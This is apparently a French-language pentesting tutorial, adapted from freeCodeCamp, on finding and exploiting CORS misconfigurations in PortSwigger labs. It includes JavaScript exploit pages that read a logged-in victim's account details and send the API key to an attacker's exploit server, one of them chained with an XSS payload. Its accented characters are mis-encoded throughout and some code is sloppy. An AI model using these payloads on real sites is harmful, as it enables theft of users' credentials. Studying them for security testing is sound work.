---
title: Exploiter CORS ‚Äì Comment tester les vuln√©rabilit√©s de partage de ressources
  cross-origin
subtitle: ''
author: Nairuz Abulhul
co_authors: []
series: null
date: '2023-03-09T16:25:31.000Z'
originalURL: https://freecodecamp.org/news/exploiting-cors-guide-to-pentesting
coverImage: https://www.freecodecamp.org/news/content/images/2023/03/possessed-photography-_E1PQXKUkMw-unsplash--4-.jpg
tags:
- name: Application Security
  slug: application-security
- name: CORS
  slug: cors
- name: penetration testing
  slug: penetration-testing
seo_title: Exploiter CORS ‚Äì Comment tester les vuln√©rabilit√©s de partage de ressources
  cross-origin
seo_desc: "All web browsers implement a security model known as the Same-Origin Policy\
  \ (SOP). It restricts domains from accessing and retrieving data from other domains‚Äô\
  \ resources. \nThe SOP policy helps protect users from malicious scripts that could\
  \ access the..."
---

Tous les navigateurs web impl√©mentent un mod√®le de s√©curit√© connu sous le nom de **Same-Origin Policy (SOP)**. Il restreint les domaines d'acc√®s et de r√©cup√©ration de donn√©es √† partir des ressources d'autres domaines.

La politique SOP aide √† prot√©ger les utilisateurs des scripts malveillants qui pourraient acc√©der √† leurs donn√©es sensibles ou effectuer des actions non autoris√©es en leur nom.

Par exemple, si `**business.com**` tente de faire une requ√™te HTTP √† `**metrics.com**`, le navigateur, par d√©faut, bloquera la requ√™te car elle provient d'un domaine diff√©rent.

Bien que la SOP semble √™tre une politique de protection appropri√©e, elle ne s'adapte pas bien aux technologies actuelles qui d√©pendent les unes des autres pour fonctionner. Par exemple, elle pr√©sente des d√©fis pour les API et les microservices qui ont des cas d'utilisation l√©gitimes pour acc√©der et partager des informations entre domaines.

En raison de cas comme celui-ci, il √©tait n√©cessaire d'avoir un nouveau m√©canisme de s√©curit√© qui permettrait les interactions cross-domain. Il est connu sous le nom de **Cross-Origin Resource Sharing (CORS)**.

Cet article couvrira les bases du fonctionnement de CORS et identifiera les vuln√©rabilit√©s courantes qui peuvent survenir lorsque CORS n'est pas correctement impl√©ment√©. Nous apprendrons √©galement comment tester et exploiter les mauvaises configurations afin qu'√† la fin de ce guide, vous aurez une meilleure compr√©hension de comment tester et valider CORS lors d'une √©valuation de pentest.

J'utiliserai les labs CORS de Port Swigger pour d√©montrer les √©tapes de test et d'exploitation.

## Table des mati√®res

* [Qu'est-ce que la politique Cross-Site Origin (CORS) ?](#heading-quest-ce-que-la-politique-cross-site-origin-cors)
* [Impact des mauvaises configurations CORS](#heading-impact-des-mauvaises-configurations-cors)
* [Comment identifier CORS](#heading-comment-identifier-cors)
* [Cas exploitables](#heading-cas-exploitables)
* [Cas non exploitable](#heading-cas-non-exploitable-wild-card)
* [Mitigations](#heading-mitigations)
* [Ressources](#heading-ressources)

## Qu'est-ce que la politique Cross-Site Origin (CORS) ?

**CORS** est une fonctionnalit√© de s√©curit√© cr√©√©e pour assouplir s√©lectivement les restrictions SOP et permettre un acc√®s contr√¥l√© aux ressources de diff√©rents domaines. Les r√®gles CORS permettent aux domaines de sp√©cifier quels domaines peuvent demander des informations en ajoutant des en-t√™tes HTTP sp√©cifiques dans la r√©ponse.

Il existe plusieurs en-t√™tes HTTP li√©s √† CORS, mais nous nous int√©ressons aux deux li√©s aux vuln√©rabilit√©s couramment observ√©es ‚Äî `**Access-Control-Allow-Origin**` et `**Access-Control-Allow-Credentials**`.

**Access-Control-Allow-Origin :** Cet en-t√™te sp√©cifie les domaines autoris√©s √† lire le contenu de la r√©ponse. La valeur peut √™tre soit un caract√®re g√©n√©rique `**(*)**`, qui indique que tous les domaines sont autoris√©s, soit une liste de domaines s√©par√©s par des virgules.

```
#Tous les domaines sont autoris√©s
Access-Control-Allow-Origin: *   


#liste de domaines s√©par√©s par des virgules
Access-Control-Allow-Origin: example.com, metrics.com
```

**Access-Control-Allow-Credentials** : Cet en-t√™te d√©termine si le domaine permet le passage des identifiants ‚Äî tels que les cookies ou les en-t√™tes d'autorisation dans les requ√™tes cross-origin.

La valeur de l'en-t√™te est soit True soit False. Si l'en-t√™te est d√©fini sur "true", le domaine permet l'envoi des identifiants. S'il est d√©fini sur "false", ou non inclus dans la r√©ponse, alors ce n'est pas autoris√©.

```
#autoriser le passage des identifiants dans les requ√™tes
Access-Control-Allow-Credentials: true

#Interdire le passage dans les requ√™tes
Access-Control-Allow-Credentials: false
```

## Impact des mauvaises configurations CORS

Les mauvaises configurations CORS peuvent avoir un impact significatif sur la s√©curit√© des applications web. Voici les principales implications :

* **Vol de donn√©es :** Les attaquants peuvent utiliser les vuln√©rabilit√©s CORS pour voler des donn√©es sensibles des applications comme les cl√©s API, les cl√©s SSH, les informations personnelles identifiables (PII), ou les identifiants des utilisateurs.
* **Cross-Site Scripting (XSS)** : Les attaquants peuvent utiliser les vuln√©rabilit√©s CORS pour effectuer des attaques XSS en injectant des scripts malveillants dans les pages web pour voler des jetons de session ou effectuer des actions non autoris√©es au nom de l'utilisateur.
* **Ex√©cution de code √† distance** dans certains cas ([Cas StackStorm](https://quitten.github.io/StackStorm/))

## Comment identifier CORS

Lors du test d'une application pour CORS, nous v√©rifions si l'une des r√©ponses de l'application contient les en-t√™tes CORS. Nous pouvons utiliser la fonctionnalit√© de recherche dans Burp Suite pour rechercher rapidement les en-t√™tes.

Dans l'exemple ci-dessous, j'ai recherch√© l'en-t√™te `**Access-Control-Allow-Credentials**` et j'ai obtenu trois (3) r√©ponses. Une fois les en-t√™tes identifi√©s, nous pouvons s√©lectionner les requ√™tes et les envoyer √† Repeater pour une analyse plus approfondie.

![Image](https://miro.medium.com/v2/resize:fit:1678/1*73ksv0ZrBWRf8dQZ7TliOg.png)

![Image](https://miro.medium.com/v2/resize:fit:1574/1*FVD7mLNMgvsdWa5XVV9MSA.png)
_Figures 1 & 2 montrent la fonctionnalit√© de recherche dans Burp Suite pour rechercher les en-t√™tes CORS._

Pour identifier les probl√®mes CORS, nous pouvons modifier l'en-t√™te Origin dans les requ√™tes avec plusieurs valeurs et voir quels en-t√™tes de r√©ponse nous obtenons de l'application. Il existe quatre (4) fa√ßons connues de faire cela, que nous allons passer en revue maintenant.

### 1. Origines r√©fl√©chies

D√©finissez l'en-t√™te Origin dans la requ√™te sur un domaine arbitraire, tel que `[**https://attackersdomain.com**](https://attackersdomain.com./)`, et v√©rifiez l'en-t√™te `**Access-Control-Allow-Origin**` dans la r√©ponse. S'il refl√®te le domaine exact que vous avez fourni dans la requ√™te, cela signifie que le domaine ne filtre aucune origine.

Le risque de cette mauvaise configuration est √©lev√© si le domaine permet le passage des identifiants dans les requ√™tes. Nous pouvons valider cela en v√©rifiant si l'en-t√™te `**Access-Control-Allow-Credentials**` est √©galement inclus dans la r√©ponse et est d√©fini sur `**true**`.

Cependant, le risque est faible si le passage des identifiants n'est pas autoris√©, car le navigateur ne traitera pas les r√©ponses des requ√™tes authentifi√©es.

üîç Pour exploiter les origines r√©fl√©chies, consultez la section exploitation ‚Äî Cas #1.

![Figure 3 ‚Äî montre la valeur de l'en-t√™te Origin incluse dans l'en-t√™te Access-Control-Allow-Origin. r3dbuck3t #cors #websecurity](https://miro.medium.com/v2/resize:fit:1155/1*pKnCmYc30pYH0jyBFhmcDw.png)
_Figure 3 ‚Äî montre la valeur de l'en-t√™te Origin incluse dans l'en-t√™te Access-Control-Allow-Origin._

### 2. Origines modifi√©es

D√©finissez l'en-t√™te Origin sur une valeur qui correspond au domaine cibl√©, mais ajoutez un pr√©fixe ou un suffixe au domaine pour v√©rifier s'il y a une validation sur les d√©buts ou les fins du domaine.

Si aucune v√©rification n'est en place, nous pouvons cr√©er un domaine correspondant similaire qui contourne la politique CORS sur le domaine cibl√©. Par exemple, ajouter un pr√©fixe ou un suffixe au domaine `**metrics.com**` serait quelque chose comme `**attackmetrics.com**` ou `**metrics.com.attack.com**`.

Le risque de cette mauvaise configuration est consid√©r√© comme √©lev√© si le domaine permet le passage des identifiants avec l'en-t√™te `**Access-Control-Allow-Credentials**` d√©fini sur **true**. L'attaquant peut cr√©er un domaine correspondant similaire et r√©cup√©rer des informations sensibles du domaine cibl√©.

Mais le risque serait faible si les requ√™tes authentifi√©es n'√©taient pas autoris√©es.

üîç Pour exploiter les origines modifi√©es, consultez la section exploitation ‚Äî Cas #1.

### 3. Sous-domaines de confiance avec protocole non s√©curis√©.

D√©finissez l'en-t√™te Origin sur un sous-domaine existant et voyez s'il l'accepte. Si c'est le cas, cela signifie que le domaine fait confiance √† tous ses sous-domaines. Ce n'est pas une bonne id√©e car si l'un des sous-domaines a une vuln√©rabilit√© Cross-Site Scripting (XSS), cela permettra √† l'attaquant d'injecter une charge utile JS malveillante et d'effectuer des actions non autoris√©es.

Cette mauvaise configuration est consid√©r√©e comme un risque √©lev√© si le domaine accepte les sous-domaines avec un protocole non s√©curis√©, tel que HTTP, et que l'en-t√™te des identifiants est d√©fini sur true. Sinon, elle ne sera pas exploitable et ne sera qu'une mauvaise impl√©mentation de CORS.

üîç Pour exploiter les sous-domaines de confiance, consultez la section exploitation ‚Äî Cas #3.

![Figure 4 ‚Äî montre que l'application accepte des sous-domaines non s√©curis√©s arbitraires. https://medium.com/r3d-buck3t ‚Äî #cors #websecurity #web](https://miro.medium.com/v2/resize:fit:1155/1*XDNb4TzErgfuuQzqYUv12w.png)
_Figure 4 ‚Äî montre que l'application accepte des sous-domaines non s√©curis√©s arbitraires._

### 4. Origine nulle

D√©finissez l'en-t√™te Origin sur la valeur nulle ‚Äî `**Origin: null**`, et voyez si l'application d√©finit l'en-t√™te `**Access-Control-Allow-Origin**` sur null. Si c'est le cas, cela signifie que les origines nulles sont sur liste blanche.

Le niveau de risque est consid√©r√© comme √©lev√© si le domaine permet les requ√™tes authentifi√©es avec l'en-t√™te `**Access-Control-Allow-Credentials**` d√©fini sur `**true**`.

Mais si ce n'est pas le cas, alors le probl√®me est consid√©r√© comme faible et non exploitable.

üîç Pour exploiter les origines nulles, consultez la section exploitation ‚Äî Cas #2.

![Figure 5 ‚Äî montre que l'application a accept√© la valeur nulle et l'a retourn√©e dans la r√©ponse. #pentesting #cors #bugbounty https://medium.com/r3d-buck3t](https://miro.medium.com/v2/resize:fit:1155/1*jyqdCfY0J_s0ebH50WrIhA.png)
_Figure 5 ‚Äî montre que l'application a accept√© la valeur nulle et l'a retourn√©e dans la r√©ponse._

## Cas exploitables de CORS

Dans cette section, nous allons passer en revue comment exploiter les mauvaises configurations CORS en les cat√©gorisant en cas de test pour une compr√©hension facile.

### Cas 1 : Origine r√©fl√©chie

L'application est consid√©r√©e comme vuln√©rable lorsqu'elle d√©finit **Access-Control-Allow-Origin** sur le domaine fourni par l'attaquant et permet le passage des identifiants avec **Access-Control-Allow-Credentials** d√©fini sur true.

```
Access-Control-Allow-Origin: http://attacker-domain.com
Access-Control-Allow-Credentials: true
```

![Figure 3 ‚Äî montre la valeur de l'en-t√™te Origin incluse dans l'en-t√™te Access-Control-Allow-Origin. r3dbuck3t #cors #websecurity](https://miro.medium.com/v2/resize:fit:1155/1*pKnCmYc30pYH0jyBFhmcDw.png)
_Figure 6 ‚Äî montre les en-t√™tes CORS pour l'origine r√©fl√©chie._

L'exploitation n√©cessite que l'attaquant h√©berge le script JS sur un serveur externe pour qu'il soit accessible √† l'utilisateur. Ensuite, ils doivent cr√©er une page HTML, int√©grer le script JS ci-dessous et l'envoyer √† l'utilisateur.

```
<html>
  <body>
    <script>

    #Initialiser l'objet XMLHttpRequest et la variable d'URL de l'application 
        var req = new XMLHttpRequest();
        var url = ("APPLICATION URL");

    #L'objet XMLHttpRequest charge, ex√©cute la fonction reqListener()
      req.onload = retrieveKeys;

    #Faire une requ√™te GET √† l'emplacement des d√©tails du compte de l'application
        req.open('GET', url + "/accountDetails",true);
    
    #Autoriser le passage des identifiants avec les requ√™tes
    req.withCredentials = true;

    #Envoyer la requ√™te 
        req.send(null);

    function retrieveKeys() {
            location='/log?key='+this.responseText;
        };

  </script>
  <body>
</html>
```

Une fois que l'utilisateur visite votre page h√©berg√©e, elle soumettra automatiquement une requ√™te CORS pour r√©cup√©rer des informations sur l'utilisateur √† partir de l'emplacement sp√©cifi√© dans le script. Comprendre la structure de l'application et l'endroit o√π elle stocke ses informations sensibles est essentiel pour cette √©tape.

Le script ci-dessus commence par initialiser l'objet `**XMLHttpRequest**` (XHR) pour indiquer au navigateur web que nous allons transf√©rer des donn√©es vers et depuis un serveur web en utilisant le protocole HTTP. XHR est une API de navigateur qui permet aux langages de script c√¥t√© client tels que JavaScript de faire des requ√™tes HTTP √† un serveur et de recevoir leurs r√©ponses dynamiquement sans n√©cessiter que l'utilisateur rafra√Æchisse la page.

Ensuite, nous instruisons l'objet d'ex√©cuter une fonction appel√©e **`retrieveKeys`** qui r√©cup√®re la cl√© API admin et envoie la r√©ponse lorsque le chargement est termin√©.

Ensuite, nous faisons une requ√™te GET en sp√©cifiant l'emplacement √† partir duquel nous voulons r√©cup√©rer des informations et passons nos identifiants avec la fonction `Credentials` d√©finie sur true.

La requ√™te sera automatiquement bloqu√©e et refus√©e si le serveur de l'application n'autorise pas le passage des identifiants entre les domaines. Mais nous savons que cela n'arrivera pas ici car `**access-Control-Allow-Credentials**` est d√©fini sur true.

Pour d√©montrer comment le script fonctionne, j'utiliserai le serveur d'exploitation disponible avec le lab de PortSwigger pour h√©berger le script ci-dessus.

Connectez-vous √† l'application, cliquez sur **"Go to exploit server"**, et collez le script dans le corps. Ensuite, cliquez sur "**Deliver exploit to victim**". Dans un sc√©nario r√©el, vous devez envoyer le lien √† l'utilisateur et essayer de l'inciter √† cliquer dessus.

![Image](https://miro.medium.com/v2/resize:fit:1505/1*hIfdCKiIogCOquzGVz686w.png)

![Image](https://miro.medium.com/v2/resize:fit:1888/1*svwpXxlVZpxpqiRQV8u_hg.png)
_Figures 7 & 8 ‚Äî montrent le processus d'h√©bergement de la charge utile JS et de sa livraison √† l'utilisateur._

Apr√®s avoir livr√© l'exploit, cliquez sur **"Access log"** et vous devriez pouvoir voir la cl√© API de l'admin captur√©e dans les logs. Copiez la cha√Æne qui contient la cl√© et collez-la dans le **D√©codeur** de Burp Suite et d√©codez-la en tant qu'URL pour r√©cup√©rer la valeur en clair.

![Image](https://miro.medium.com/v2/resize:fit:2584/1*2zq3p_IKD032TRHZdZPURA.png)

![Image](https://miro.medium.com/v2/resize:fit:1787/1*5NNTx2nk9eLKT1fATokzCw.png)
_Figures 9 & 10 ‚Äî montrent la cl√© API de l'admin dans les logs et la valeur de la cl√© en texte clair sur le D√©codeur._

### Cas 2 : Origine nulle

L'application est consid√©r√©e comme vuln√©rable lorsqu'elle d√©finit **Access-Control-Allow-Origin** sur la valeur nulle et permet le passage des identifiants avec **`Access-Control-Allow-Credentials`** d√©fini sur **true.**

```
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

![Figure 5 ‚Äî montre que l'application a accept√© la valeur nulle et l'a retourn√©e dans la r√©ponse. #pentesting #cors #bugbounty https://medium.com/r3d-buck3t](https://miro.medium.com/v2/resize:fit:1155/1*jyqdCfY0J_s0ebH50WrIhA.png)
_Figure 11 ‚Äî montre que le serveur de l'application accepte les origines nulles._

L'exploitation n√©cessite que nous h√©bergions le fichier de script JS pour qu'il soit accessible √† l'utilisateur cibl√© (_m√™me que dans le cas #1_). Encore une fois, nous utiliserons le m√™me script ‚Äî juste cette fois, nous ajouterons un iframe sandbox pour r√©cup√©rer la cl√© API. La propri√©t√© sandbox d√©finit l'origine du cadre sur null afin que nous puissions d√©finir l'en-t√™te Origin sur la valeur nulle.

```
<html>
    <body>
        <iframe style="display: none;" sandbox="allow-scripts" srcdoc="
        <script>
            var req = new XMLHttpRequest();
            var url = 'APPLICATION URL'
            req.onload = retrieveKeys;

            req.open('GET', url + '/accountDetails', true);
            req.withCredentials = true;
            req.send(null);

           function retrieveKeys() {
               fetch('https://Exolit_Server_Hostname/log?key=' + req.responseText)
            }
        </script>"></iframe>
    </body>
</html>
```

Lorsque l'utilisateur authentifi√© clique sur notre lien `[**http://192.168.1.14:5555/cors_null_poc.html**](http://192.168.1.14:5555/cors_null_poc.html.)`, nous obtiendrons la cl√© API √† partir des d√©tails du compte. Mais comme notre utilisateur n'est pas un admin, nous ne pourrons pas r√©cup√©rer la cl√© API de l'admin.

Le but de montrer les √©tapes ci-dessous est que lors d'une √©valuation de test d'application web, en tant que testeur, vous recevrez des comptes admin et utilisateur r√©gulier pour tester avec eux. Dans ces cas, vous suivez les √©tapes ci-dessous pour montrer votre preuve de concept en h√©bergeant le fichier localement. Ou, bien s√ªr, vous pouvez h√©berger le fichier en externe comme option alternative.

![Image](https://miro.medium.com/v2/resize:fit:2412/1*a4Qtndhg7lDtOUriDT6CWA.png)

![Image](https://miro.medium.com/v2/resize:fit:1916/1*MgEzSTxHOyF2oZQ1yNftnQ.png)
_Figures 12 & 13 ‚Äî montrent que la valeur nulle est ajout√©e √† l'en-t√™te de la requ√™te et que l'utilisateur a acc√©d√© √† la page cors_null_poc._

![Figure 14 ‚Äî montre les d√©tails du compte de l'utilisateur lors du clic sur le lien. https://medium.com/r3d-buck3t #cors #web #pentesting](https://miro.medium.com/v2/resize:fit:1155/1*ppYb-xcA4Fx-Doh3vw62HQ.png)
_Figure 14 ‚Äî montre les d√©tails du compte de l'utilisateur lors du clic sur le lien._

### Cas 3 : Sous-domaines de confiance

L'application est consid√©r√©e comme vuln√©rable lorsqu'elle d√©finit **Access-Control-Allow-Origin** sur l'un de ses sous-domaines et permet les identifiants avec **Access-Control-Allow-Credentials** d√©fini sur **true.**

L'exploitation de ce cas d√©pend du fait que le sous-domaine existant est vuln√©rable √† une vuln√©rabilit√© XSS pour permettre √† l'attaquant d'abuser de la mauvaise configuration.

```
Access-Control-Allow-Origin: subdomainattacker.example.com
Access-Control-Allow-Credentials: true
```

![Figure 15 ‚Äî montre que le domaine accepte les origines de ses sous-domaines. https://medium.com/r3d-buck3t #cors #web #pentesting #hacking](https://miro.medium.com/v2/resize:fit:1155/1*a-Fvk06eJoyL-9W9Oo5lvQ.png)
_Figure 15 ‚Äî montre que le domaine accepte les origines de ses sous-domaines._

Si vous rencontrez ce sc√©nario, vous devez v√©rifier tous les sous-domaines existants et essayer d'en trouver un avec une vuln√©rabilit√© XSS pour l'exploiter.

Dans le lab #3 de Port Swigger, l'application fait confiance √† son sous-domaine ‚Äî **stock** ‚Äî qui est vuln√©rable √† une vuln√©rabilit√© XSS dans le param√®tre `**ProductId=**`.

![Image](https://miro.medium.com/v2/resize:fit:2082/1*HBCf3Iwa82ZAB0Frlll_pA.png)

![Image](https://miro.medium.com/v2/resize:fit:2023/1*vqSoc_DI8kjbJTx-aF2DBg.png)
_Figures 16 & 17 ‚Äî montrent le sous-domaine stocks vuln√©rable √† XSS dans le param√®tre ProductId._

Nous utiliserons le m√™me script pour exploiter ce cas, sauf que nous ajouterons l'emplacement o√π nous injectons la charge utile en utilisant la fonction `**document.location**`. Ensuite, nous formatons la charge utile pour qu'elle soit une charge utile en une ligne afin que nous puissions la passer dans le param√®tre.

```
<script>
    document.location="http://subdomain.domain.com/?productId=<script>
    <script>
       var req = new XMLHttpRequest();
       req.onload = retrieveKeys;
       req.open('GET', "APPLICATION URL/accountDetails",true);
       req.withCredentials = true;
       req.send(null);

       function retrieveKeys() {
            location='https://Exolit_Server_Hostname/log?key='+this.responseText;
        };

  </script> 
      </script>
```

Apr√®s cela, nous enregistrons le script sous `**cors_poc.html**`, l'h√©bergeons sur notre serveur et envoyons le lien √† l'utilisateur.

```
<html>
<body>
<script>
    document.location="http://Insecure-subdomain/?productId=<script>var req = new XMLHttpRequest(); req.onload = retrieveKeys; req.open('get','APPLICATION URL/accountDetails',true); req.withCredentials = true;req.send();function retrieveKeys() {location='https://exploit-0a110003034945dec57758a8018500a8.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
</body>
</html>
```

Comme vous pouvez le voir ci-dessous dans les captures d'√©cran, lorsque l'utilisateur a acc√©d√© au lien, le script a inject√© la charge utile dans le param√®tre `**productId**` et a r√©cup√©r√© la cl√© API.

![Image](https://miro.medium.com/v2/resize:fit:2454/1*bQu-QJBOmrH_DynC_VNbeg.png)

![Image](https://miro.medium.com/v2/resize:fit:2531/1*-j8W-uY7yk-UmYol1cBzqg.png)

![Image](https://miro.medium.com/v2/resize:fit:1957/1*NiWGBfvbWHT8Y47BuVrJ0w.png)
_Figures 18, 19 & 20 ‚Äî montrent l'injection de la charge utile XSS et la capture de la cl√© API en action._

## Cas non exploitable : Wild Card (*)

L'application n'est PAS vuln√©rable lorsque **Access-Control-Allow-Origin** est d√©fini sur le caract√®re g√©n√©rique `*****`, m√™me si l'en-t√™te **Access-Control-Allow-Credentials** est d√©fini sur true.

Cela est d√ª √† une v√©rification de s√©curit√© en place qui d√©sactive l'en-t√™te Allow-Credentials lorsque l'origine est d√©finie sur un caract√®re g√©n√©rique.

## Mitigations

* Impl√©menter des en-t√™tes CORS appropri√©s : Le serveur peut ajouter des en-t√™tes CORS appropri√©s pour permettre les requ√™tes cross-origin uniquement √† partir de sites de confiance.
* Restreindre l'acc√®s aux donn√©es sensibles : Il est important de restreindre l'acc√®s aux donn√©es sensibles uniquement aux domaines de confiance. Cela peut √™tre fait en impl√©mentant des mesures de contr√¥le d'acc√®s telles que l'authentification et l'autorisation.

## Conclusion

Dans ce tutoriel, nous avons couvert les bases de CORS en tant que fonctionnalit√© de s√©curit√© qui emp√™che les pages web de faire des requ√™tes non autoris√©es √† diff√©rents domaines.

Nous avons √©galement couvert les techniques de test CORS standard pour d√©tecter et exploiter les mauvaises configurations CORS avec des outils comme Burp Suites et Chrome DevTools.

En impl√©mentant et en testant correctement CORS, les d√©veloppeurs web peuvent s'assurer que leurs applications web sont s√©curis√©es et √©viter les mauvaises configurations qui permettent aux attaquants d'acc√©der √† des ressources non autoris√©es et de compromettre la s√©curit√© de l'application.

### Ressources

* [https://ranakhalil.teachable.com/p/web-security-academy-video-series](https://ranakhalil.teachable.com/p/web-security-academy-video-series)
* [https://www.trustedsec.com/blog/cors-findings/](https://www.trustedsec.com/blog/cors-findings/)
* [https://www.we45.com/post/3-ways-you-can-exploit-cors-misconfigurations](https://www.we45.com/post/3-ways-you-can-exploit-cors-misconfigurations)
* [https://www.geekboy.ninja/blog/exploiting-misconfigured-cors-cross-origin-resource-sharing/](https://www.geekboy.ninja/blog/exploiting-misconfigured-cors-cross-origin-resource-sharing/)